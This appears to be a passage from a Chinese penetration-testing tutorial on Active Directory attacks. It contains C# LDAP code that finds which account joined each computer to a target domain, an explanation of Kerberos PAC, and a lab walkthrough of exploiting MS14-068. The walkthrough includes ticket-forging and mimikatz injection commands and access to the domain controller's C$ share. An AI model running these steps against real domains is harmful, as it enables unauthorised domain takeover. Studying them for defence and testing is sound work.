使用代码.net代码编译exe，查询主机加入域所使用的域账号！
    using System;
    using System.Security.Principal;
    using System.DirectoryServices;
    namespace ConsoleApp9
    {
        class Program
        {
            static void Main(string[] args)
            {
                DirectoryEntry ldap_conn = new DirectoryEntry("LDAP://dc=hacke,dc=testlab");  //这里改成对方的域名
                DirectorySearcher search = new DirectorySearcher(ldap_conn);
                String query = "(&(objectClass=computer))";//查找计算机
                search.Filter = query;
                foreach (SearchResult r in search.FindAll())
                {
                    String mS_DS_CreatorSID="";
                    String computername = "";
                    try
                    {
                        computername = r.Properties["dNSHostName"][0].ToString();
                        mS_DS_CreatorSID = (new SecurityIdentifier((byte[])r.Properties["mS-DS-CreatorSID"][0], 0)).ToString();
                        //Console.WriteLine("{0} {1}\n", computername, mS_DS_CreatorSID);
                    }
                    catch
                    {
                        ;
                    }
                    //再通过sid找用户名
                    String UserQuery = "(&(objectClass=user))";
                    DirectorySearcher search2 = new DirectorySearcher(ldap_conn);
                    search2.Filter = UserQuery;
                    foreach (SearchResult u in search2.FindAll())
                    {
                        String user_sid = (new SecurityIdentifier((byte[])u.Properties["objectSid"][0], 0)).ToString();
                        if (user_sid == mS_DS_CreatorSID) {
                            //Console.WriteLine("debug");
                            String username = u.Properties["name"][0].ToString();
                            Console.WriteLine("[*] [{0}] -> creator  [{1}]",computername, username);
                        }
                    }
                }
            }
        }
    }
在编译过程中可能会报错缺少引用库，只需要加上就可以了！  
并且最好多编译几个版本，4.0版本12+可以用 ，而win7 08就用不了。4.0以下的7 8都能用  
参考链接
>   
>   right-you-probably-have-never-heard-of/>  
>    
>    
>    
>    
>
>   
>    
>    
>    
>    
>
>   
>
>   
>    
>    
>
> [https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&mid=2247483689&idx=1&sn=1d83538cebbe2197c44b9e5cc9a7997f&chksm=eaa5bb09ddd2321fc6bc838bc5e996add511eb7875faec2a7fde133c13a5f0107e699d47840c&scene=126&sessionid=1584603915&key=cf63f0cc499df801cce7995aeda59fae16a26f18d48f6a138cf60f02d27a89b7cfe0eab764ee36c6208343e0c235450a6bd202bf7520f6368cf361466baf9785a1bcb8f1965ac9359581d1eee9c6c1b6&ascene=1&uin=NTgyNDEzOTc%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=A8KlWjR%2F8GBWKaJZTJ2e5Fg%3D&pass_ticket=B2fG6ICJb5vVp1dbPCh3AOMIfoBgH2TXNSxmnLYPig8%3D](https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&mid=2247483689&idx=1&sn=1d83538cebbe2197c44b9e5cc9a7997f&chksm=eaa5bb09ddd2321fc6bc838bc5e996add511eb7875faec2a7fde133c13a5f0107e699d47840c&scene=126&sessionid=1584603915&key=cf63f0cc499df801cce7995aeda59fae16a26f18d48f6a138cf60f02d27a89b7cfe0eab764ee36c6208343e0c235450a6bd202bf7520f6368cf361466baf9785a1bcb8f1965ac9359581d1eee9c6c1b6&ascene=1&uin=NTgyNDEzOTc%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=A8KlWjR%2F8GBWKaJZTJ2e5Fg%3D&pass_ticket=B2fG6ICJb5vVp1dbPCh3AOMIfoBgH2TXNSxmnLYPig8%3D)  
>    
>    
>    
>  
# PAC
## PAC与Kerberos的关系
### 0x00 PAC简介
PAC是特权属性证书，用来向Serber端表明Client的权限。
### 0x01 PAC介绍
当用户Client-A与Serber-B完成认证， 只是向Serber-B证明了Client-A就是所谓的Client-A，但此时Client-A如果需要访问Server-B上的网络资源，但Server-B现在其实并不直到Client-A是否有访问自身网络资源的权限(Kerberos协议中并没有关规定权限问题)
于是就巧妙的引入了PAC解决了这个问题
在一个域中，如何才能知道某个域用户所拥有的权限呢？自然是需要提供User的SID和所在组Group的SID。必须了解的一个前提是，KDC，A、B三者中，B只信任KDC所提供的关于A到底是什么权限，所以在域初始时，KDC上拥有A和B的权限。现在需要解决的是，KDC必须告诉B关于A的权限，这样B验证A的权限后才能决定让不让A访问自身的网络资源。
为了让Server-B能知道Client-A所具有的权限，微软在KRB_AS_REP中的TGT中增加了Client-A的PAC（特权属性证书
），也就是Client-A的权限，包括Client-A的SID、Group的SID：  
可以看到被KDC加密的TGT中，不仅包括了被加密的Session Keya-kdc，还包括KRB_AS_REQ中申请者（Client-A）的权限属性证书，为了防止该特权证书被篡改（即使被KDC加密，Client-A也无法轻易解密，但谁也无法保证绝对的安全），在PAC的尾部添加了两个检验ServerSignature和KDCSignature:
在这里serber Signature和KDC
Signature对Client而言，Server代表的是TGS服务，KDC代表的是AS服务（AS作为Client-A与TGS的第三方信任机构）。但是AS服务与TGS服务具有相同的krgtbt账号的密码生成的，当然，整个TGT也是用KDC的密码也就是krbtgt通过它账号密码加密的，他们三者不同的是，用的算法和加密内容有所不同。
微软是这样打算的，无论如何也要把PAC从KDC传送到Serber-B，为了在Kerberos认证过程中实现，微软选择了如下做法：
将PAC放在TGT中加密后从AS服务经Client-A中转给TGS服务，再放在由TGS服务返回的ServiceTicket中加密后经Client-A中转给Serber-B  
在这里需要注意的是，在KRB_TGS_REQ阶段，携带PAC的TGT被TGS服务接收后，认证Client-A的合法性后（解密Authenticator符合要求）会将PAC解密出来，验证尾部两个签名的合法性，如何合法则认为PAC没有被篡改，于是重新在PAC的尾部更换了另外两个签名，一个是Server
Signature，这次是以Server-B的密码副本生成的签名(因为对于Client-A和Server-B，这次的第三方机构是TGS)，另一个是KDC
Signature，这次不再使用KDC的长期有效的key，而是使用在AS阶段生成的短期有效的SessionKeya-b。最后称为
新的PAC被拷贝在ST中被加密起来。
最后绕来绕去，KDC上所拥有的关于Client-A的权限证书PAC终于发给了Server-B，Server-B在对Client-A进行认证的同时，也能判断Client-A有没有访问网络资源的权限。
参考链接
    https://www.freebuf.com/vuls/56081.html
## MS14-068
### 0x00 漏洞效果
能够将任意一台域机器提升成域控相关权限
### 0x01 漏洞成因
首先请先了解kerberos认证与PAC，漏洞成因有三
**第一个原因**
在KDC机构对
PAC进行验证时，对于PAC尾部的签名算法，虽然原理上必须是带有Key的签名算法才可以，但是微软在是线上，确实允许任意签名算法。只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证！
**第二个错误**
PAC没有被放在TGT中，而是放在了TGS_REQ数据包的其他地方。但是KDC在实现上竟然允许这样的构造，也就是说，KDC能够正确解析出没有放在其他地方的PAC信息！
**第三个错误**
只要TGS_REQ按照刚才漏洞要求设置，KDC服务器会做出令人吃惊的事情：它不仅会从Authenticator中取出subkey把PAC信息解密并利用客户端设定的签名算法验证签名，同时将另外的TGT进行解密得到SeeesionKeya-kdc
最后验证成后，在PAC信息的尾部，重新采用自身的Serber_key和KDC_key生成一个带Key的签名，把SessionKeya-kdc用subkey加密，从而组合成一个新的TGT返回给Client-A。
    https://www.freebuf.com/vuls/56081.html
### 0x02 漏洞利用条件
  * 小于2012R2的域控没有打KB3011780，高版本默认集成
  * 无论工作组、域，高低权限都可以使用生成的票据进行攻击
  * 域账户使用时需要klist purge清除票据
### 0x03 漏洞利用过程
**WIN环境**
> 域控08R2 192.168.60.55 hacke.top.com 机器名 WIN-1CO4ES74OQM  
>  域成员机器 192.168.60.50 test QWE123!@#
获取某一个域用户的sid
    whoami /all > sid.txt
    S-1-5-21-662684005-512120196-2632585872-1105
获取域用户的明文密码
    QWE123!@#
获取域名
    hacke.top.com
票据生成命令
    MS14-068.exe -u PI:EMAIL -s S-1-5-21-662684005-512120196-2632585872-1105 -d 192.168.60.55 -p QWE123!@#
票据注入
    kerberos::ptc PI:EMAIL //将票据注入到内存中
通过域控的机器名进行访问
    dir \\WIN-1CO4ES74OQM\C$
在这里不在域内的机器也可以  
也可以使用goldenPac.exe，它可以结合psexec直接执行命令(不会弹框)
**Linux版本** 可以使用goldenPac.py
参考链接
> 
# 总结
本文大部分论点还是出于我的角度来写的，这么多知识点分开来展示可能问题不大。但是放在一起后可能会有部分的杂乱，但无疑实验肯定是能够成功的，也写上了我的观点。如委派等知识点，师傅们也可以看看其他人怎么写的。每个人的写作视角都是不同的，多看看多理解也就会了。